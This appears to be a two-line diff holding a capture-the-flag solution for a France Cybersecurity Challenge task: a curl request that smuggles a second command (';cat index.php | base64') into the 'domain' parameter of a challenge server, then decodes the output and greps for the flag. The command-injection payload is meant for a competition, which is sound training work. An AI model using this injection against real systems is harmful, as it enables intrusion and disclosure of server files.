@@ -1,0 +1,2 @@
+curl http://challenges1.france-cybersecurity-challenge.fr:7001/index.php\?domain\=%3Bcat+index.php+%7C+base64 > base64.txt
+cat base64.txt | decode64 | grep -E "FCSC{.*?}" -o
